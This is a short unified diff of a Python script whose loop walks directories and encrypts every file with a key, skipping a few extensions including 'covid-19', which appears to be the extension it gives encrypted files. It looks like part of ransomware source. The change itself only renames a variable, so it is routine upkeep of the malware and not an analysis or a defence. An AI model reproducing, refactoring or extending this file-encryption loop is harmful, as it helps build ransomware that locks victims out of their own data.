@@ -93,8 +93,8 @@ while True:
                             my_ext = ["pyc", "pyd", "tcl", "h", "msg", "enc", "covid-19"]
                             if not(ext in my_ext):
                                 try:
-                                    ally = os.path.join(root, file)
-                                    file_encrypt(key, ally)
+                                    full_path = os.path.join(root, file)
+                                    file_encrypt(key, full_path)
                                 except PermissionError:
                                     pass
                                 except:
